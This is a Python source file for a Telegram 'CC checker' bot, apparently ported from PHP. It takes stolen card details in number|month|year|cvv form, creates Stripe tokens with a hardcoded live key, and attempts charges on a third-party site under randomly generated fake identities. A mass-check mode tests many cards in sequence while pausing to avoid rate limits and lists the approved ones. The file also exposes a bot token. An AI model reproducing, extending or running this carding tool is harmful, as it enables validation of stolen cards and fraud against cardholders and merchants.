import requests
import json
import re
import random
import string
import time
import datetime
import urllib.parse
import sys
import hashlib
import uuid
import os

# error_reporting(0); # Python equivalent is typically handled by try-except or logging configuration.
# date_default_timezone_set('Asia'); # Setting timezone requires external libraries like pytz. Using system default or UTC for simplicity in time formatting.

config = {
    'authorized_users': [5248903529, 7081556047, 7092074614],
    'support_group': -1002312627606,
    'support_username': '@checkerXgroup',
    'owner': '@Mod_By_Kamal',
    'bot_token': '7638618978:AAHZVGSG_jFLEr8VmBUSKUS106NAHogE1Go'
}

def bot(method, params=None):
    """
    Sends a request to the Telegram Bot API.
    """
    if params is None:
        params = {}
    global config
    url = f"https://api.telegram.org/bot{config['bot_token']}/{method}"
    try:
        response = requests.post(url, json=params)
        response.raise_for_status() # Raise an exception for bad status codes
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error sending request to Telegram API: {e}")
        return None

def saveUser(userId):
    """
    Saves a user ID to the users.txt file if not already registered.
    """
    user_id_str = str(userId)
    filename = 'users.txt'
    
    # Ensure the file exists
    if not os.path.exists(filename):
        with open(filename, 'w') as f:
            pass # Create empty file

    try:
        with open(filename, 'r') as f:
            users = f.read()
    except IOError as e:
        print(f"Error reading users file: {e}")
        users = "" # Treat as empty if read fails

    if f"{user_id_str}\n" not in users:
        try:
            with open(filename, 'a') as f:
                f.write(f"{user_id_str}\n")
        except IOError as e:
            print(f"Error writing to users file: {e}")

def isRegistered(userId):
    """
    Checks if a user ID is registered in the users.txt file.
    """
    user_id_str = str(userId)
    filename = 'users.txt'
    
    if not os.path.exists(filename):
        return False # File doesn't exist, no users registered

    try:
        with open(filename, 'r') as f:
            users = f.read()
    except IOError as e:
        print(f"Error reading users file: {e}")
        return False # Cannot read file, assume not registered

    return f"{user_id_str}\n" in users

def isAuthorized(userId):
    """
    Checks if a user ID is in the authorized_users list.
    """
    global config
    return userId in config['authorized_users']

def extractCC(text):
    """
    Extracts credit card details from a string using various patterns.
    """
    patterns = [
        r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3})',
        r'(\d{16})\s+(\d{2})\s+(\d{2,4})\s+(\d{3})',
        r'(\d{16})\|(\d{2})\/(\d{2,4})\/(\d{3})',
        r'(\d{16})\/(\d{2})\/(\d{2})\/(\d{3})'
    ]

    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            year = match.group(3)
            # Convert 4-digit year to 2-digit year
            if len(year) == 4:
                year = year[-2:]
                
            return {
                'cc': match.group(1),
                'month': match.group(2),
                'year': year,
                'cvv': match.group(4)
            }
    return False

def generateRandomData():
    """
    Generates random first name, last name, and email.
    """
    # Generate random first and last names
    letters = string.ascii_lowercase
    firstname = ''.join(random.choice(letters) for i in range(8))
    lastname = ''.join(random.choice(letters) for i in range(8))
    
    # Generate random email with common domains
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    randomDomain = random.choice(domains)
    email = f"{firstname}{random.randint(100, 999)}@{randomDomain}"
    
    return {
        'firstname': firstname.capitalize(),
        'lastname': lastname.capitalize(),
        'email': email,
    }

def checkCC(cc, month, year, cvv):
    """
    Performs the credit card check using Stripe tokenization and a charge attempt.
    """
    randomData = generateRandomData()
    
    # First Request - Generate Stripe Token
    url1 = 'https://api.stripe.com/v1/tokens'
    headers1 = {
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    postData1 = {
        'card[number]': cc,
        'card[exp_month]': month,
        'card[exp_year]': year,
        'card[cvc]': cvv,
        'card[name]': f"{randomData['firstname']} {randomData['lastname']}",
        'time_on_page': random.randint(30000, 60000),
        'guid': str(uuid.uuid4()), # PHP uniqid() is not truly unique, uuid4 is better but matches intent
        'muid': str(uuid.uuid4()),
        'sid': str(uuid.uuid4()),
        'key': 'pk_live_7brFCCZ0CF9HUzYyJ3a7aMj2',
        'payment_user_agent': 'stripe.js/78ef418'
    }

    try:
        response1 = requests.post(url1, headers=headers1, data=postData1, verify=False) # verify=False matches CURLOPT_SSL_VERIFYPEER, false
        token = response1.json()
    except requests.exceptions.RequestException as e:
        print(f"Error during Stripe token request: {e}")
        return {
            'success': False,
            'message': 'Token generation failed',
            'error': f'Request error: {e}'
        }
    except json.JSONDecodeError:
         return {
            'success': False,
            'message': 'Token generation failed',
            'error': 'Invalid JSON response from Stripe'
        }

    if 'id' not in token:
        return {
            'success': False,
            'message': 'Token generation failed',
            'error': token.get('error', {}).get('message', 'Unknown error')
        }

    # Second Request - Charge Attempt
    url2 = 'https://frethub.com/register/FJKfhw'
    headers2 = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://frethub.com',
        'referer': 'https://frethub.com/free-trial-join/'
    }

    # PHP md5(uniqid()) is not truly unique, using uuid4 and md5 hash
    nonce = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()

    chargeData = {
        'nonce': nonce,
        'stripe_action': 'charge',
        'charge_type': 'new',
        'subscription': '1',
        'first_name': randomData['firstname'],
        'last_name': randomData['lastname'],
        'email': randomData['email'],
        'cc_number': cc,
        'cc_expmonth': month,
        'cc_expyear': year,
        'cc_cvc': cvv,
        'stripeToken': token['id']
    }

    try:
        response2 = requests.post(url2, headers=headers2, data=chargeData)
        response2_text = response2.text
    except requests.exceptions.RequestException as e:
        print(f"Error during Charge attempt request: {e}")
        return {
            'success': False,
            'message': f'Charge request failed: {e}'
        }
    
    if 'status=success' in response2_text:
        return {
            'success': True,
            'message': 'Card charged successfully'
        }
    else:
        # Find the reason parameter
        reason_match = re.search(r'reason=([^&]*)', response2_text)
        if reason_match:
            error = urllib.parse.unquote(reason_match.group(1))
        else:
            error = 'Card declined' # Default message if reason not found
            
        return {
            'success': False,
            'message': error
        }

def formatResponse(check, cc_data):
    """
    Formats the response string for the Telegram message.
    """
    emojis = "✅" if check['success'] else "❌"
    # Using system time, formatted as h:i:s A
    time_str = datetime.datetime.now().strftime('%I:%M:%S %p')
    
    # Accessing global config directly
    owner = config['owner']

    response_text = f"""
╔════════════════════╗
║ 𝗖𝗖 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 ║
╚════════════════════╝

▶️ 𝗖𝗖: {cc_data['cc']}
▶️ 𝗠𝗠/𝗬𝗬: {cc_data['month']}/{cc_data['year']}
▶️ 𝗖𝗩𝗩: {cc_data['cvv']}

𝗦𝘁𝗮𝘁𝘂𝘀: {emojis} {check['message']}
𝗧𝗶𝗺𝗲: {time_str}

═══════════════════
𝗕𝗢𝗧 𝗕𝗬: {owner}
"""
    return response_text

# --- Main Script Logic ---

# Read the raw POST body (simulating php://input)
try:
    update_raw = sys.stdin.read()
    update = json.loads(update_raw)
except json.JSONDecodeError:
    print("Invalid JSON received.")
    sys.exit()
except Exception as e:
    print(f"Error reading input: {e}")
    sys.exit()

message = update.get('message')

if not message:
    # No message in update, exit silently like PHP die()
    sys.exit()

chat_id = message['chat']['id']
user_id = message['from']['id']
text = message.get('text', '')
chat_type = message['chat']['type']
message_id = message.get('message_id') # Get message_id for replies

if text == '/start':
    welcome_text = f"""
╔══════════════════════╗
║   𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗖 𝗕𝗢𝗧   ║
╚══════════════════════╝

▶️ 𝗥𝗲𝗴𝗶𝘀𝘁𝗲𝗿: /register
▶️ 𝗖𝗵𝗲𝗰𝗸 𝗖𝗖: /chk or .chk
▶️ 𝗚𝗿𝗼𝘂𝗽: {config['support_username']}

𝗕𝗢𝗧 𝗕𝗬: {config['owner']}
"""
    bot('sendMessage', {
        'chat_id': chat_id,
        'text': welcome_text,
        'parse_mode': 'HTML'
    })

elif text == '/register':
    saveUser(user_id)
    bot('sendMessage', {
        'chat_id': chat_id,
        'text': f"✅ 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝗮𝘁𝗶𝗼𝗻 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹!\n\n𝗨𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗶𝗻: {config['support_username']}",
        'parse_mode': 'HTML'
    })

elif text.startswith('/chk') or text.startswith('.chk'):
    if not isRegistered(user_id):
        bot('sendMessage', {
            'chat_id': chat_id,
            'text': "❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗴𝗶𝘀𝘁𝗲𝗿 𝗳𝗶𝗿𝘀𝘁 𝘂𝘀𝗶𝗻𝗴 /register",
            'parse_mode': 'HTML',
            'reply_to_message_id': message_id # Added reply_to_message_id
        })
        sys.exit() # Equivalent to PHP die()

    if chat_type == 'private' and not isAuthorized(user_id):
        bot('sendMessage', {
            'chat_id': chat_id,
            'text': f"❌ 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗶𝗻: {config['support_username']}",
            'parse_mode': 'HTML',
            'reply_to_message_id': message_id # Added reply_to_message_id
        })
        sys.exit() # Equivalent to PHP die()

    cc_data = extractCC(text)
    if not cc_data:
        bot('sendMessage', {
            'chat_id': chat_id,
            'text': "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗖𝗖 𝗳𝗼𝗿𝗺𝗮𝘁!\n\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲𝘀:\n5381130100659567|06|25|267\n5218071149227041|03|2026|096",
            'parse_mode': 'HTML',
            'reply_to_message_id': message_id # Added reply_to_message_id
        })
        sys.exit() # Equivalent to PHP die()

    # Send "Checking..." message first
    checking_msg = bot('sendMessage', {
        'chat_id': chat_id,
        'text': "⌛ Checking...",
        'parse_mode': 'HTML',
        'reply_to_message_id': message_id
    })

    # Get the message_id of the "Checking..." message to edit it later
    checking_message_id = checking_msg['result']['message_id'] if checking_msg and 'result' in checking_msg else None

    check = checkCC(cc_data['cc'], cc_data['month'], cc_data['year'], cc_data['cvv'])
    response_text = formatResponse(check, cc_data)
    
    if checking_message_id:
        # Edit the "Checking..." message with the final result
        bot('editMessageText', {
            'chat_id': chat_id,
            'message_id': checking_message_id,
            'text': response_text,
            'parse_mode': 'HTML'
        })
    else:
        # Fallback: send a new message if editing failed
        bot('sendMessage', {
            'chat_id': chat_id,
            'text': response_text,
            'parse_mode': 'HTML',
            'reply_to_message_id': message_id
        })


# Note: The PHP code has a separate if block for /mchk, meaning it could potentially run
# even if a previous elif block matched. This is unusual flow control.
# In Python, elif ensures only one block runs. To replicate the PHP behavior exactly,
# we would need separate if statements. Let's use separate if statements to match PHP's logic.

if text.startswith('/mchk') or text.startswith('.mchk'):
    if not isRegistered(user_id):
        bot('sendMessage', {
            'chat_id': chat_id,
            'text': "❌ Please register first using /register",
            'parse_mode': 'HTML',
            'reply_to_message_id': message_id
        })
        sys.exit() # Equivalent to PHP die()

    # Remove the command from the text
    # Use regex to handle potential spaces after command
    text_after_command = re.sub(r'^[/.]mchk\s*', '', text, 1)
    
    # Clean up the input and split into lines
    lines = text_after_command.replace("\r", "").split("\n")
    valid_cards = []
    
    # Process each line
    # PHP regex was /^(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3})$/
    # Python regex needs raw string and anchors
    card_pattern = r'^(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3})$'
    
    for line in lines:
        line = line.strip()
        match = re.match(card_pattern, line)
        if match:
            year = match.group(3)
            # PHP logic: strlen($matches[3]) == 2 ? $matches[3] : substr($matches[3], -2)
            # This seems contradictory to extractCC which converts 4 to 2.
            # Let's stick to the /mchk logic: if 2 digits, keep; if >2 digits, take last 2.
            # The regex only matches 2 or 4 digits, so we only need to handle 4.
            if len(year) == 4:
                 year = year[-2:]

            valid_cards.append({
                'cc': match.group(1),
                'month': match.group(2),
                'year': year,
                'cvv': match.group(4)
            })

    if not valid_cards:
        bot('sendMessage', {
            'chat_id': chat_id,
            'text': "❌ No valid cards found in input\nFormat: xxxxxxxxxxxxxxxx|mm|yy|cvv",
            'parse_mode': 'HTML',
            'reply_to_message_id': message_id
        })
        sys.exit() # Equivalent to PHP die()

    # Send initial status message
    initial_msg_response = bot('sendMessage', {
        'chat_id': chat_id,
        'text': "⌛ Starting Mass Check...",
        'parse_mode': 'HTML',
        'reply_to_message_id': message_id
    })

    # Get the message_id of the initial status message to edit it later
    initial_msg_id = initial_msg_response['result']['message_id'] if initial_msg_response and 'result' in initial_msg_response else None

    if not initial_msg_id:
        # If sending the initial message failed, we can't proceed with editing
        print("Failed to send initial mass check message.")
        sys.exit()

    total_cards = len(valid_cards)
    approved = 0
    declined = 0
    approved_cards = []

    # Function to update the status message
    def update_status_message(current_index, approved_count, declined_count, approved_list):
        status_msg = "═══════════════════════\n"
        status_msg += "          𝙈𝘼𝙎𝙎 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 𝟮.𝟬        \n"
        status_msg += "═══════════════════════\n"
        status_msg += f"⌬ 𝙏𝙤𝙩𝙖𝙡 𝘾𝙖𝙧𝙙𝙨: {total_cards}\n"
        status_msg += f"⌬ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜: {current_index}/{total_cards}\n"
        status_msg += f"⌬ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙: {approved_count}\n"
        status_msg += f"⌬ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙: {declined_count}\n"
        status_msg += "═══════════════════════"

        if approved_list:
            status_msg += "\n\n𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙖𝙧𝙙𝙨 ✅\n"
            status_msg += "\n".join(approved_list)

        bot('editMessageText', {
            'chat_id': chat_id,
            'message_id': initial_msg_id,
            'text': status_msg,
            'parse_mode': 'HTML'
        })

    # Send initial status message (before processing starts)
    update_status_message(0, approved, declined, approved_cards)


    # Process each card
    for index, card in enumerate(valid_cards):
        # Check the card
        check = checkCC(card['cc'], card['month'], card['year'], card['cvv'])
        
        if check['success']:
            approved += 1
            # PHP format was "{$card['cc']}|{$card['month']}|{$card['year']}|{$card['cvv']} - ✅"
            # Need to use the potentially modified year (2 digits) from the valid_cards list
            approved_cards.append(f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']} - ✅")
        else:
            declined += 1

        # Update status message after each card
        update_status_message(index + 1, approved, declined, approved_cards)

        # Add delay between checks to avoid rate limiting
        time.sleep(3)

    # Final status message
    final_msg = "═══════════════════════\n"
    final_msg += "          𝙈𝘼𝙎𝙎 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 𝟮.𝟬        \n"
    final_msg += "═══════════════════════\n"
    final_msg += "⌬ 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 ✅\n"
    final_msg += f"⌬ 𝙏𝙤𝙩𝙖𝙡 𝘾𝙖𝙧𝙙𝙨: {total_cards}\n"
    final_msg += f"⌬ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙: {approved}\n"
    final_msg += f"⌬ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙: {declined}\n"
    final_msg += "═══════════════════════"

    if approved_cards:
        final_msg += "\n\n𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙖𝙧𝙙𝙨 ✅\n"
        final_msg += "\n".join(approved_cards)

    bot('editMessageText', {
        'chat_id': chat_id,
        'message_id': initial_msg_id,
        'text': final_msg,
        'parse_mode': 'HTML'
    })

# The script finishes here. In a typical webhook setup, the script exits after processing
# the request. sys.exit() is used within conditional blocks where PHP used die().
# If no command matches, the script simply finishes without sending a message,
# which matches the PHP behavior.
